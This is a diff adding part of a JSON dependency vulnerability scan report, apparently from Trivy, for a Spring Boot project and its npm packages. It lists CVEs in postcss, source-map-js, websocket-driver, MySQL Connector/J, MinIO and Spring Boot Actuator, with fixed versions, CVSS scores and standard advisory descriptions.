+          "PublishedDate": "2026-08-11T17:19:16.69Z",
+          "LastModifiedDate": "2026-10-24T15:10:00.19Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-45623",
+          "VendorIDs": [
+            "GHSA-6g55-p6wh-862q"
+          ],
+          "PkgID": "postcss@8.5.6",
+          "PkgName": "postcss",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/postcss@8.5.6",
+            "UID": "e142556b6deded66"
+          },
+          "InstalledVersion": "8.5.6",
+          "FixedVersion": "8.5.12",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-45623",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:b140e3fb9817d0ea1375104e82f79d61434b78414de55a3698c1c5d7110bb8a7",
+          "Title": "postcss: PostCSS: Information disclosure and denial of service via crafted CSS input",
+          "Description": "PostCSS takes a CSS file and provides an API to analyze and modify its rules by transforming the rules into an Abstract Syntax Tree. In versions 8.5.11 and prior, the PreviousMap parses the /*# sourceMappingURL=PATH */ comment from any CSS string passed to process() and dereferences PATH against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting JSON.parse SyntaxError message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no from, no map, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.). This issue has been fixed in version 8.5.12.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22",
+            "CWE-200"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 4,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+              "V3Score": 9.1
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-45623",
+            "https://advisory.echohq.com/cve/CVE-2026-45623",
+            "https://github.com/advisories/GHSA-6g55-p6wh-862q",
+            "https://github.com/postcss/postcss",
+            "https://github.com/postcss/postcss/commit/aaec7b78b3ce2792585b4b300ef1bd5dd5b3e8ad",
+            "https://github.com/postcss/postcss/commit/c64b7488d2731dfa16213739b42c34faf5a9eba3",
+            "https://github.com/postcss/postcss/releases/tag/8.5.12",
+            "https://github.com/postcss/postcss/security/advisories/GHSA-6g55-p6wh-862q",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-45623",
+            "https://www.cve.org/CVERecord?id=CVE-2026-45623"
+          ],
+          "PublishedDate": "2026-07-27T18:16:55.13Z",
+          "LastModifiedDate": "2026-08-07T00:13:41.957Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-73646",
+          "VendorIDs": [
+            "GHSA-r28c-9q8g-f849"
+          ],
+          "PkgID": "postcss@8.5.6",
+          "PkgName": "postcss",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/postcss@8.5.6",
+            "UID": "e142556b6deded66"
+          },
+          "InstalledVersion": "8.5.6",
+          "FixedVersion": "8.5.18",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-73646",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:3892026baefe17dcde8d7bd7e0f2aca97466964c8367fcd23682d2aa338e677c",
+          "Title": "postcss: PostCSS: Information disclosure via path traversal in source map auto-loading",
+          "Description": "PostCSS takes a CSS file and provides an API to analyze and modify its rules by transforming the rules into an Abstract Syntax Tree. Prior to 8.5.18, lib/previous-map.js loadMap() passes attacker-controlled sourceMappingURL values to join(dirname(opts.from), annotation), and loadFile() permits traversed or absolute .map paths, allowing untrusted CSS processed without map: false to disclose sourcesContent from arbitrary reachable .map files through result.map. This issue is fixed in version 8.5.18.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-22"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-73646",
+            "https://advisory.echohq.com/cve/CVE-2026-73646",
+            "https://github.com/postcss/postcss",
+            "https://github.com/postcss/postcss/commit/95663d3eb7ba26f4854dd19d3b4f4425760cf56c",
+            "https://github.com/postcss/postcss/releases/tag/8.5.18",
+            "https://github.com/postcss/postcss/security/advisories/GHSA-r28c-9q8g-f849",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-73646",
+            "https://www.cve.org/CVERecord?id=CVE-2026-73646"
+          ],
+          "PublishedDate": "2026-08-17T16:17:47.257Z",
+          "LastModifiedDate": "2026-09-18T20:05:53.723Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-93749",
+          "VendorIDs": [
+            "GHSA-68fv-2mgg-jv7q"
+          ],
+          "PkgID": "source-map-js@1.2.1",
+          "PkgName": "source-map-js",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "dee32b591d281e9a"
+          },
+          "InstalledVersion": "1.2.1",
+          "FixedVersion": "1.2.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-93749",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:47ca1d4340e4852e792b4507eb514b5c6b4339b32280acdbb4e76882733d2b62",
+          "Title": "source-map-js: source-map-js: Denial of Service via malformed indexed source maps",
+          "Description": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1284"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-93749",
+            "https://advisory.echohq.com/cve/CVE-2026-93749",
+            "https://github.com/7rulnik/source-map-js",
+            "https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118",
+            "https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016",
+            "https://github.com/7rulnik/source-map-js/issues/76",
+            "https://github.com/7rulnik/source-map-js/pull/79",
+            "https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-93749",
+            "https://www.cve.org/CVERecord?id=CVE-2026-93749",
+            "https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service"
+          ],
+          "PublishedDate": "2026-09-18T18:18:33.48Z",
+          "LastModifiedDate": "2026-09-22T20:25:55.87Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-54466",
+          "VendorIDs": [
+            "GHSA-xv26-6w52-cph6"
+          ],
+          "PkgID": "websocket-driver@0.7.4",
+          "PkgName": "websocket-driver",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/websocket-driver@0.7.4",
+            "UID": "61f00f1405ecb601"
+          },
+          "InstalledVersion": "0.7.4",
+          "FixedVersion": "0.7.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-54466",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:87eca30702379c76a3cd770d7bc9ef7fd17ce97d7c0ad8b04b7a6c75871312f2",
+          "Title": "websocket-driver is a WebSocket protocol handler with pluggable I/O. P ...",
+          "Description": "websocket-driver is a WebSocket protocol handler with pluggable I/O. Prior to 0.7.5, the frame format in draft versions of the WebSocket protocol includes a length header that allows an arbitrarily large integer to be encoded as a sequence of bytes with the high bit set. By sending an indefinite sequence of bytes with values 0x80 or above, a client can make the server parse these bytes into an ever-growing integer in lib/websocket/driver/draft75.js; because JavaScript numbers are 64-bit floating point values, this number will eventually lose precision and lead to the subsequent payload being parsed incorrectly. This issue is fixed in version 0.7.5.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-130"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "nvd": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N",
+              "V40Score": 9.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://github.com/faye/websocket-driver-node",
+            "https://github.com/faye/websocket-driver-node/commit/5b197ca874dab58e96cacad8a3c256797d804680",
+            "https://github.com/faye/websocket-driver-node/releases/tag/0.7.5",
+            "https://github.com/faye/websocket-driver-node/security/advisories/GHSA-xv26-6w52-cph6"
+          ],
+          "PublishedDate": "2026-07-17T21:17:08.657Z",
+          "LastModifiedDate": "2026-10-24T20:10:00.137Z"
+        }
+      ]
+    },
+    {
+      "Target": "pom.xml",
+      "Class": "lang-pkgs",
+      "Type": "pom",
+      "Packages": [
+        {
+          "ID": "sg.edu.nus.iss:c2c-sectrade:0.0.1-SNAPSHOT::a51b6803",
+          "Name": "sg.edu.nus.iss:c2c-sectrade",
+          "Identifier": {
+            "PURL": "pkg:maven/sg.edu.nus.iss/c2c-sectrade@0.0.1-SNAPSHOT",
+            "UID": "5b9ff27a00300bea"
+          },
+          "Version": "0.0.1-SNAPSHOT",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "root",
+          "DependsOn": [
+            "com.github.penggle:kaptcha:2.3.2::746cd290",
+            "com.mysql:mysql-connector-j:8.0.33::a82c58cc",
+            "io.jsonwebtoken:jjwt-api:0.11.5::4597491b",
+            "io.jsonwebtoken:jjwt-impl:0.11.5::c2e4458c",
+            "io.jsonwebtoken:jjwt-jackson:0.11.5::fce0bb89",
+            "io.minio:minio:8.5.7::ae6ff99b",
+            "org.mybatis.spring.boot:mybatis-spring-boot-starter:3.0.3::52b89d4e",
+            "org.springframework.boot:spring-boot-starter-actuator:3.2.3::548b21b5",
+            "org.springframework.boot:spring-boot-starter-data-elasticsearch:3.2.3::2c47274d",
+            "org.springframework.boot:spring-boot-starter-data-redis:3.2.3::ea2ccdea",
+            "org.springframework.boot:spring-boot-starter-security:3.2.3::18f9eb3a",
+            "org.springframework.boot:spring-boot-starter-web:3.2.3::a7322a5d",
+            "org.springframework.boot:spring-boot-starter-websocket:3.2.3::b92e11d6"
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.github.penggle:kaptcha:2.3.2::746cd290",
+          "Name": "com.github.penggle:kaptcha",
+          "Identifier": {
+            "PURL": "pkg:maven/com.github.penggle/kaptcha@2.3.2",
+            "UID": "2522b8cee2e49478"
+          },
+          "Version": "2.3.2",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 82,
+              "EndLine": 86
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.mysql:mysql-connector-j:8.0.33::a82c58cc",
+          "Name": "com.mysql:mysql-connector-j",
+          "Identifier": {
+            "PURL": "pkg:maven/com.mysql/mysql-connector-j@8.0.33",
+            "UID": "a5cfd5a4b658efe3"
+          },
+          "Version": "8.0.33",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 48,
+              "EndLine": 53
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "io.jsonwebtoken:jjwt-api:0.11.5::4597491b",
+          "Name": "io.jsonwebtoken:jjwt-api",
+          "Identifier": {
+            "PURL": "pkg:maven/io.jsonwebtoken/jjwt-api@0.11.5",
+            "UID": "c5b21c12ae05b82a"
+          },
+          "Version": "0.11.5",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 54,
+              "EndLine": 58
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "io.jsonwebtoken:jjwt-impl:0.11.5::c2e4458c",
+          "Name": "io.jsonwebtoken:jjwt-impl",
+          "Identifier": {
+            "PURL": "pkg:maven/io.jsonwebtoken/jjwt-impl@0.11.5",
+            "UID": "d12e22fd92bc7f24"
+          },
+          "Version": "0.11.5",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 59,
+              "EndLine": 64
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "io.jsonwebtoken:jjwt-jackson:0.11.5::fce0bb89",
+          "Name": "io.jsonwebtoken:jjwt-jackson",
+          "Identifier": {
+            "PURL": "pkg:maven/io.jsonwebtoken/jjwt-jackson@0.11.5",
+            "UID": "2d276c9c6fe6e0d5"
+          },
+          "Version": "0.11.5",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 65,
+              "EndLine": 70
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "io.minio:minio:8.5.7::ae6ff99b",
+          "Name": "io.minio:minio",
+          "Identifier": {
+            "PURL": "pkg:maven/io.minio/minio@8.5.7",
+            "UID": "258e3c7be2ea175f"
+          },
+          "Version": "8.5.7",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 87,
+              "EndLine": 91
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.mybatis.spring.boot:mybatis-spring-boot-starter:3.0.3::52b89d4e",
+          "Name": "org.mybatis.spring.boot:mybatis-spring-boot-starter",
+          "Identifier": {
+            "PURL": "pkg:maven/org.mybatis.spring.boot/mybatis-spring-boot-starter@3.0.3",
+            "UID": "b99d111286cadba8"
+          },
+          "Version": "3.0.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 35,
+              "EndLine": 39
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-actuator:3.2.3::548b21b5",
+          "Name": "org.springframework.boot:spring-boot-starter-actuator",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-actuator@3.2.3",
+            "UID": "216f9e56953e2524"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 31,
+              "EndLine": 34
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-data-elasticsearch:3.2.3::2c47274d",
+          "Name": "org.springframework.boot:spring-boot-starter-data-elasticsearch",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-data-elasticsearch@3.2.3",
+            "UID": "6838825b2668d091"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 44,
+              "EndLine": 47
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-data-redis:3.2.3::ea2ccdea",
+          "Name": "org.springframework.boot:spring-boot-starter-data-redis",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-data-redis@3.2.3",
+            "UID": "f054d3b8ff5b5e7f"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 40,
+              "EndLine": 43
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-security:3.2.3::18f9eb3a",
+          "Name": "org.springframework.boot:spring-boot-starter-security",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-security@3.2.3",
+            "UID": "3c734665f76ba3d6"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 27,
+              "EndLine": 30
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-web:3.2.3::a7322a5d",
+          "Name": "org.springframework.boot:spring-boot-starter-web",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.3",
+            "UID": "7040208f3d527a05"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 23,
+              "EndLine": 26
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "org.springframework.boot:spring-boot-starter-websocket:3.2.3::b92e11d6",
+          "Name": "org.springframework.boot:spring-boot-starter-websocket",
+          "Identifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-websocket@3.2.3",
+            "UID": "b4e74af35128612"
+          },
+          "Version": "3.2.3",
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 92,
+              "EndLine": 95
+            }
+          ],
+          "AnalyzedBy": "pom"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2023-22102",
+          "VendorIDs": [
+            "GHSA-m6vm-37g8-gqvh"
+          ],
+          "PkgID": "com.mysql:mysql-connector-j:8.0.33::a82c58cc",
+          "PkgName": "com.mysql:mysql-connector-j",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/com.mysql/mysql-connector-j@8.0.33",
+            "UID": "a5cfd5a4b658efe3"
+          },
+          "InstalledVersion": "8.0.33",
+          "FixedVersion": "8.2.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2023-22102",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:cbb11714ed208eb0e9ded1c87301484c2b4d13b66c578e582ac76b960e8837c5",
+          "Title": "mysql-connector-java: Connector/J unspecified vulnerability (CPU October 2023)",
+          "Description": "Vulnerability in the MySQL Connectors product of Oracle MySQL (component: Connector/J).  Supported versions that are affected are 8.1.0 and prior. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Connectors.  Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in MySQL Connectors, attacks may significantly impact additional products (scope change). Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.1 Base Score 8.3 (Confidentiality, Integrity and Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-284"
+          ],
+          "VendorSeverity": {
+            "cbl-mariner": 3,
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V3Score": 8.4,
+              "V40Score": 8.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H",
+              "V3Score": 8.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2023-22102",
+            "https://github.com/mysql/mysql-connector-j",
+            "https://github.com/mysql/mysql-connector-j/compare/8.1.0...8.2.0",
+            "https://nvd.nist.gov/vuln/detail/CVE-2023-22102",
+            "https://security.netapp.com/advisory/ntap-20231027-0007",
+            "https://security.netapp.com/advisory/ntap-20231027-0007/",
+            "https://www.cve.org/CVERecord?id=CVE-2023-22102",
+            "https://www.oracle.com/security-alerts/cpuoct2023.html",
+            "https://www.oracle.com/security-alerts/cpuoct2023.html#AppendixMSQL"
+          ],
+          "PublishedDate": "2023-10-17T22:15:15.1Z",
+          "LastModifiedDate": "2026-06-17T05:34:45.07Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-59952",
+          "VendorIDs": [
+            "GHSA-h7rh-xfpj-hpcm"
+          ],
+          "PkgID": "io.minio:minio:8.5.7::ae6ff99b",
+          "PkgName": "io.minio:minio",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.minio/minio@8.5.7",
+            "UID": "258e3c7be2ea175f"
+          },
+          "InstalledVersion": "8.5.7",
+          "FixedVersion": "8.6.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-59952",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:addb6ea20b07ffcacbbb77dc79db9b01c0a5126f5b67b4cf3e18ee529fa3229c",
+          "Title": "io.minio/minio: minio-java Client XML Tag is Vulnerable to Value Substitution",
+          "Description": "MinIO Java SDK is a Simple Storage Service (aka S3) client to perform bucket and object operations to any Amazon S3 compatible object storage service. In minio-java versions prior to 8.6.0, XML tag values containing references to system properties or environment variables were automatically substituted with their actual values during processing. This unintended behavior could lead to the exposure of sensitive information, including credentials, file paths, or system configuration details, if such references were present in XML content from untrusted sources. This is fixed in version 8.6.0.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-20",
+            "CWE-94"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-59952",
+            "https://github.com/minio/minio-java",
+            "https://github.com/minio/minio-java/commit/f7a98d06b25e5464bdd4811b044e25ff9101d37f",
+            "https://github.com/minio/minio-java/releases/tag/8.6.0",
+            "https://github.com/minio/minio-java/security/advisories/GHSA-h7rh-xfpj-hpcm",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-59952",
+            "https://www.cve.org/CVERecord?id=CVE-2025-59952"
+          ],
+          "PublishedDate": "2025-09-30T04:43:46.573Z",
+          "LastModifiedDate": "2026-10-09T09:10:00.213Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-22733",
+          "VendorIDs": [
+            "GHSA-mgvc-8q2h-5pgc"
+          ],
+          "PkgID": "org.springframework.boot:spring-boot-starter-actuator:3.2.3::548b21b5",
+          "PkgName": "org.springframework.boot:spring-boot-starter-actuator",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/org.springframework.boot/spring-boot-starter-actuator@3.2.3",
+            "UID": "216f9e56953e2524"
+          },
+          "InstalledVersion": "3.2.3",
+          "FixedVersion": "4.0.4, 3.5.12",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-22733",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:77e5099ca17e9edcaad301f16c3ef78f622fa1ce067e4874a5540d061b5101ec",
+          "Title": "Spring Boot has an Authentication Bypass under Actuator CloudFoundry endpoints",
+          "Description": "Spring Boot applications with Actuator can be vulnerable to an \"Authentication Bypass\" vulnerability when an application endpoint that requires authentication is declared under the path used by the CloudFoundry Actuator endpoints. This issue affects Spring Security: from 4.0.0 through 4.0.3, from 3.5.0 through 3.5.11, from 3.4.0 through 3.4.14, from 3.3.0 through 3.3.17, from 2.7.0 through 2.7.31.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-288"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "nvd": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
+              "V3Score": 8.2
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 8.1
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/CVE-2026-22733",
+            "https://github.com/advisories/GHSA-mgvc-8q2h-5pgc",
+            "https://github.com/spring-projects/spring-boot",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-22733",
+            "https://spring.io/security/cve-2026-22733"
+          ],
+          "PublishedDate": "2026-03-20T00:16:15.513Z",
+          "LastModifiedDate": "2026-06-17T10:20:19.003Z"
+        }
+      ]
+    }
+  ]
+}
